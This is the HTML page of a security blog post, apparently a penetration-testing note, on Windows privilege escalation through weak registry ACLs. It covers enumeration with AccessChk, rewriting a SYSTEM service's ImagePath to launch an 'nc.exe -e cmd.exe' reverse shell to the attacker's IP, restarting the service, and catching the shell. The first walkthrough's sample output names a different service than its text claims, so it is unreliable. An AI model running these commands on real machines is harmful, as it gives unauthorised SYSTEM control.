@@ -1,0 +1,221 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Weak Registry ACLs | Twistzz</title><meta name="author" content="Twistzz"><meta name="copyright" content="Twistzz"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="➜ Weak Registry ACLs occur when a low-privileged user has write or full control permissions over a service registry key, allowing them to modify critical values such as ImagePath. This allows an atta">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Weak Registry ACLs">
+<meta property="og:url" content="https://twistzz-ctf.github.io/2026/06/19/Weak-Registry-ACLs/index.html">
+<meta property="og:site_name" content="Twistzz">
+<meta property="og:description" content="➜ Weak Registry ACLs occur when a low-privileged user has write or full control permissions over a service registry key, allowing them to modify critical values such as ImagePath. This allows an atta">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://twistzz-ctf.github.io/images/avatar.png">
+<meta property="article:published_time" content="2026-06-19T17:23:48.000Z">
+<meta property="article:modified_time" content="2026-08-18T23:24:52.236Z">
+<meta property="article:author" content="Twistzz">
+<meta property="article:tag" content="AccessChk">
+<meta property="article:tag" content="ImagePath">
+<meta property="article:tag" content="KEY_SET_VALUE">
+<meta property="article:tag" content="Modifiable-Registry-Key">
+<meta property="article:tag" content="Registry-Permissions">
+<meta property="article:tag" content="Set-ItemProperty">
+<meta property="article:tag" content="Weak-ACL">
+<meta property="article:tag" content="Weak-Registry-ACLs">
+<meta property="article:tag" content="Windows-Services">
+<meta property="article:tag" content="sc.exe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://twistzz-ctf.github.io/images/avatar.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Weak Registry ACLs",
+  "url": "https://twistzz-ctf.github.io/2026/06/19/Weak-Registry-ACLs/",
+  "image": "https://twistzz-ctf.github.io/images/avatar.png",
+  "datePublished": "2026-06-19T17:23:48.000Z",
+  "dateModified": "2026-08-18T23:24:52.236Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Twistzz",
+      "url": "https://twistzz-ctf.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/images/favicon.ico"><link rel="canonical" href="https://twistzz-ctf.github.io/2026/06/19/Weak-Registry-ACLs/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Weak Registry ACLs',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 8.1.2"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/images/avatar.png" alt="Logo"><span class="site-name">Twistzz</span></a><a class="nav-page-title" href="/"><span class="site-name">Weak Registry ACLs</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div></div></nav><div id="post-info"><h1 class="post-title">Weak Registry ACLs</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-06-19T17:23:48.000Z" title="Created 2026-06-19 18:23:48">2026-06-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-08-18T23:24:52.236Z" title="Updated 2026-08-19 00:24:52">2026-08-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Active-Directory/">Active Directory</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Active-Directory/Windows/">Windows</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Active-Directory/Windows/Post-Exploitation/">Post-Exploitation</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Active-Directory/Windows/Post-Exploitation/Windows-Privesc/">Windows Privesc</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Active-Directory/Windows/Post-Exploitation/Windows-Privesc/Services/">Services</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><blockquote>
+<p>➜ Weak Registry ACLs occur when a low-privileged user has write or full control permissions over a service registry key, allowing them to modify critical values such as <code>ImagePath</code>. This allows an attacker to change the service executable to a malicious binary and execute a malicious binary with SYSTEM privileges.</p>
+</blockquote>
+<h3 id="Enumerating-Weak-Registry-Permissions"><a href="#Enumerating-Weak-Registry-Permissions" class="headerlink" title="Enumerating Weak Registry Permissions"></a>Enumerating Weak Registry Permissions</h3><blockquote>
+<p>We can use AccessChk to identify services with weak registry permissions:</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; \<span class="title">ccesschk.exe</span> /<span class="title">accepteula</span> &quot;&lt;<span class="title">our</span>-<span class="title">user</span>&gt;&quot; -<span class="title">kvuqsw</span> <span class="title">hklm</span>\<span class="title">System</span>\<span class="title">CurrentControlSet</span>\<span class="title">services</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">RW</span> <span class="title">HKLM</span>\<span class="title">System</span>\<span class="title">CurrentControlSet</span>\<span class="title">services</span>\<span class="title">BTAGService</span>\<span class="title">Parameters</span>\<span class="title">Settings</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_QUERY_VALUE</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_CREATE_SUB_KEYa</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_ENUMERATE_SUB_KEYS</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_NOTIFY</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_SET_VALUE</span></span></span><br><span class="line"><span class="function">        <span class="title">READ_CONTROL</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">SNIP</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ This means the current user has full control over the <code>ModelManagerService</code> registry key.</p>
+</blockquote>
+<h3 id="Modifying-the-Service-ImagePath"><a href="#Modifying-the-Service-ImagePath" class="headerlink" title="Modifying the Service ImagePath"></a>Modifying the Service ImagePath</h3><blockquote>
+<p>Since we have write access, we can change the service executable path to a malicious binary:</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS&gt; Set-ItemProperty -Path &quot;HKLM:\SYSTEM\CurrentControlSet\Services\&lt;ServiceName&gt;&quot; -Name ImagePath -Value &quot;C:\path\to\nc.exe -e cmd.exe &lt;our-ip&gt; &lt;our-port&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>This modifies the service configuration to execute our malicious binary.</p>
+</blockquote>
+<h2 id="Restarting-the-Service"><a href="#Restarting-the-Service" class="headerlink" title="Restarting the Service"></a>Restarting the Service</h2><p>Restart the service to execute the malicious binary:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc.exe stop &lt;ServiceName&gt;</span><br><span class="line">sc.exe <span class="built_in">start</span> &lt;ServiceName&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Get-Reverse-Shell"><a href="#Get-Reverse-Shell" class="headerlink" title="Get Reverse Shell"></a>Get Reverse Shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜ rlwrap nc -lvnp our-port</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; <span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ Weak Registry ACLs occur when a low-privileged user has <code>write</code> or <code>full control</code> permissions over a service’s registry key, allowing them to modify critical values such as <code>ImagePath</code>. By pointing <code>ImagePath</code> at a malicious binary and restarting the service, an attacker executes code under the service’s account, typically <code>SYSTEM</code>.</p>
+</blockquote>
+<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h4 id="Enumerating-Weak-Registry-Permissions-1"><a href="#Enumerating-Weak-Registry-Permissions-1" class="headerlink" title="Enumerating Weak Registry Permissions"></a>Enumerating Weak Registry Permissions</h4><blockquote>
+<p>➜ We use AccessChk to recurse the services hive and list keys our user can write to. The <code>ImagePath</code> value lives directly under the service root key, so what we need is <code>KEY_SET_VALUE</code> on <code>HKLM\System\CurrentControlSet\services\&lt;service-name&gt;</code> itself</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; .\<span class="title">accesschk.exe</span> /<span class="title">accepteula</span> -<span class="title">kvuqsw</span> &quot;&lt;<span class="title">our</span>-<span class="title">user</span>&gt;&quot; <span class="title">hklm</span>\<span class="title">System</span>\<span class="title">CurrentControlSet</span>\<span class="title">services</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">RW</span> <span class="title">HKLM</span>\<span class="title">System</span>\<span class="title">CurrentControlSet</span>\<span class="title">services</span>\&lt;<span class="title">service</span>-<span class="title">name</span>&gt;</span></span><br><span class="line"><span class="function">        <span class="title">KEY_QUERY_VALUE</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_SET_VALUE</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_CREATE_SUB_KEY</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_ENUMERATE_SUB_KEYS</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_NOTIFY</span></span></span><br><span class="line"><span class="function">        <span class="title">READ_CONTROL</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">SNIP</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Checking-the-Service-Account"><a href="#Checking-the-Service-Account" class="headerlink" title="Checking the Service Account"></a>Checking the Service Account</h4><blockquote>
+<p>➜ We confirm the service runs as <code>LocalSystem</code> with <code>sc qc</code>, this is what makes the payload execute as <code>SYSTEM</code>.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; sc.exe qc &lt;service<span class="literal">-name</span>&gt;</span><br><span class="line"></span><br><span class="line">[<span class="type">SC</span>] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">    SERVICE_NAME: &lt;service<span class="literal">-name</span>&gt;</span><br><span class="line">    <span class="built_in">TYPE</span>               : <span class="number">10</span>  WIN32_OWN_PROCESS</span><br><span class="line">    START_TYPE         : <span class="number">2</span>   AUTO_START</span><br><span class="line">    BINARY_PATH_NAME   : <span class="string">&quot;C:\Program Files\&lt;service-name&gt;\&lt;service-name&gt;.exe&quot;</span></span><br><span class="line">    SERVICE_START_NAME : LocalSystem</span><br></pre></td></tr></table></figure>
+
+<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><h4 id="Modifying-the-Service-ImagePath-1"><a href="#Modifying-the-Service-ImagePath-1" class="headerlink" title="Modifying the Service ImagePath"></a>Modifying the Service ImagePath</h4><blockquote>
+<p>➜ Since we can write to the service key, we overwrite <code>ImagePath</code> to point at our payload. <code>nc.exe</code> must already be staged on disk at the path we reference.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;HKLM:\SYSTEM\CurrentControlSet\Services\&lt;service-name&gt;&quot;</span> <span class="literal">-Name</span> ImagePath <span class="literal">-Value</span> <span class="string">&quot;C:\Windows\Temp\nc.exe -e cmd.exe ip port&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Starting-the-Listener"><a href="#Starting-the-Listener" class="headerlink" title="Starting the Listener"></a>Starting the Listener</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rlwrap nc -lvnp port</span><br></pre></td></tr></table></figure>
+
+<h4 id="Restarting-the-Service-1"><a href="#Restarting-the-Service-1" class="headerlink" title="Restarting the Service"></a>Restarting the Service</h4><blockquote>
+<p>➜ Restarting forces the service to launch our new <code>ImagePath</code> and this needs <code>SERVICE_STOP</code> and <code>SERVICE_START</code> over the service (or a reboot). A raw <code>nc</code> payload isn’t service-aware, so the SCM will time out after ~30 seconds and report a start failure, that’s expected and the shell fires regardless.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; sc.exe stop &lt;service<span class="literal">-name</span>&gt;</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; sc.exe <span class="built_in">start</span> &lt;service<span class="literal">-name</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Getting-a-SYSTEM-Shell"><a href="#Getting-a-SYSTEM-Shell" class="headerlink" title="Getting a SYSTEM Shell"></a>Getting a SYSTEM Shell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  weak-registry rlwrap nc -lvnp port</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; <span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://twistzz-ctf.github.io">Twistzz</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://twistzz-ctf.github.io/2026/06/19/Weak-Registry-ACLs/">https://twistzz-ctf.github.io/2026/06/19/Weak-Registry-ACLs/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Weak-ACL/">Weak-ACL</a><a class="post-meta__tags" href="/tags/AccessChk/">AccessChk</a><a class="post-meta__tags" href="/tags/sc-exe/">sc.exe</a><a class="post-meta__tags" href="/tags/Windows-Services/">Windows-Services</a><a class="post-meta__tags" href="/tags/Weak-Registry-ACLs/">Weak-Registry-ACLs</a><a class="post-meta__tags" href="/tags/Modifiable-Registry-Key/">Modifiable-Registry-Key</a><a class="post-meta__tags" href="/tags/Registry-Permissions/">Registry-Permissions</a><a class="post-meta__tags" href="/tags/ImagePath/">ImagePath</a><a class="post-meta__tags" href="/tags/KEY-SET-VALUE/">KEY_SET_VALUE</a><a class="post-meta__tags" href="/tags/Set-ItemProperty/">Set-ItemProperty</a></div><div class="post-share"><div class="social-share" data-image="/images/avatar.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/06/19/Modifiable-Registry-Autorun-Startup-Binary/" title="Modifiable Registry Autorun &amp; Startup Binary"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Modifiable Registry Autorun & Startup Binary</div></div><div class="info-2"><div class="info-item-1"> ➜ Startup applications run automatically when a user logs in, via Run registry keys (HKLM &#x2F; HKCU) or the Startup folder. If we can overwrite the referenced executable or modify the registry value that points to it, our binary will run under the account that logs in next.  Enumeration ➜ We query the Win32_StartupCommand WMI class to list startup entries, then check the Location and User fields to find one run by a privileged user whose binary we can overwrite.  123456PS C:\&gt; Get-CimIn...</div></div></div></a><a class="pagination-related" href="/2026/06/19/Permissive-File-System-ACLs/" title="Permissive File System ACLs"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Permissive File System ACLs</div></div><div class="info-2"><div class="info-item-1"> ➜ Permissive File System ACLs occur when a low-privileged user has write or full control permissions over a service binary, allowing them to replace it with a malicious executable, when the service restarts, the payload runs under the service’s account, typically SYSTEM.  EnumerationEnumerating Modifiable Service Binaries ➜ As we can see, SharpUp identified a service whose binary has a weak ACL and lists it under Modifiable Service Binaries.  123456789101112PS C:\&gt; .\SharpUp.exe audit=== ...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/06/19/Permissive-File-System-ACLs/" title="Permissive File System ACLs"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-19</div><div class="info-item-2">Permissive File System ACLs</div></div><div class="info-2"><div class="info-item-1"> ➜ Permissive File System ACLs occur when a low-privileged user has write or full control permissions over a service binary, allowing them to replace it with a malicious executable, when the service restarts, the payload runs under the service’s account, typically SYSTEM.  EnumerationEnumerating Modifiable Service Binaries ➜ As we can see, SharpUp identified a service whose binary has a weak ACL and lists it under Modifiable Service Binaries.  123456789101112PS C:\&gt; .\SharpUp.exe audit=== ...</div></div></div></a><a class="pagination-related" href="/2026/06/16/Weak-Service-Permissions/" title="Weak Service Permissions"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-16</div><div class="info-item-2">Weak Service Permissions</div></div><div class="info-2"><div class="info-item-1"> ➜ Weak Service Permissions occur when a low-privileged user has excessive permissions over a service object ( SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS), allowing them to modify the service configuration such as the binary path and execute arbitrary code as SYSTEM.  EnumerationEnumerates Modifiable Service’configuration ➜ As we can see SharpUp identified that configuration of WindscribeService.exe is Modifiable  12345678910PS C:\&gt; .\SharpUp.exe audit=== Modifiable Services ===  Name    ...</div></div></div></a><a class="pagination-related" href="/2026/06/19/Modifiable-Registry-Autorun-Startup-Binary/" title="Modifiable Registry Autorun &amp; Startup Binary"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-19</div><div class="info-item-2">Modifiable Registry Autorun &amp; Startup Binary</div></div><div class="info-2"><div class="info-item-1"> ➜ Startup applications run automatically when a user logs in, via Run registry keys (HKLM &#x2F; HKCU) or the Startup folder. If we can overwrite the referenced executable or modify the registry value that points to it, our binary will run under the account that logs in next.  Enumeration ➜ We query the Win32_StartupCommand WMI class to list startup entries, then check the Location and User fields to find one run by a privileged user whose binary we can overwrite.  123456PS C:\&gt; Get-CimIn...</div></div></div></a><a class="pagination-related" href="/2026/06/26/Scheduled-Tasks/" title="Scheduled Tasks"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-26</div><div class="info-item-2">Scheduled Tasks</div></div><div class="info-2"><div class="info-item-1"> Scheduled Tasks automate actions such as backups, maintenance, and system updates, if a task runs with elevated privileges ( SYSTEM ) and executes a script or binary that we can modify, we can inject our own code, wait for the task to execute, and obtain code execution as SYSTEM.  Enumeration Enumerate all scheduled tasks.  1schtasks /query /fo LIST /v   Or via PowerShell.  1Get-ScheduledTask | Select-Object TaskPath, TaskName, State   Inspect a scheduled task to determine the executable or ...</div></div></div></a><a class="pagination-related" href="/2026/06/26/User-Account-Control-UAC-Bypass/" title="User Account Control (UAC) Bypass"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-26</div><div class="info-item-2">User Account Control (UAC) Bypass</div></div><div class="info-2"><div class="info-item-1"> User Account Control (UAC) is a Windows security feature that prevents unauthorized privilege escalation. When Admin Approval Mode (AAM) is enabled, administrator accounts receive two tokens at login:  A standard user token (medium integrity)    And  A full admin token (high integrity).    Processes run under the standard token by default, even for Administrators group members.   The built-in RID 500 Administrator account always runs at high integrity and is not affected by UAC.   Our attack...</div></div></div></a><a class="pagination-related" href="/2026/06/16/Unquoted-Service-Path/" title="Unquoted Service Path"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-16</div><div class="info-item-2">Unquoted Service Path</div></div><div class="info-2"><div class="info-item-1"> ➜ Unquoted Service Path occurs when a service binary path contains spaces and is not enclosed in quotes, causing Windows to search and execute executables in unintended locations. If an attacker can place a malicious executable in one of these searched paths, they can hijack the service and execute code with the service’s privileges, such as SYSTEM. ➜ Example : ➜ If the service binary path is :  1C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe   ➜ Windows will atte...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Twistzz</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">71</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">417</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">66</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Twistzz-cb" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumerating-Weak-Registry-Permissions"><span class="toc-number">1.</span> <span class="toc-text">Enumerating Weak Registry Permissions</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Modifying-the-Service-ImagePath"><span class="toc-number">2.</span> <span class="toc-text">Modifying the Service ImagePath</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Restarting-the-Service"><span class="toc-number">3.</span> <span class="toc-text">Restarting the Service</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Get-Reverse-Shell"><span class="toc-number">4.</span> <span class="toc-text">Get Reverse Shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Enumeration"><span class="toc-number">5.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Enumerating-Weak-Registry-Permissions-1"><span class="toc-number">5.1.</span> <span class="toc-text">Enumerating Weak Registry Permissions</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Checking-the-Service-Account"><span class="toc-number">5.2.</span> <span class="toc-text">Checking the Service Account</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploitation"><span class="toc-number">6.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Modifying-the-Service-ImagePath-1"><span class="toc-number">6.1.</span> <span 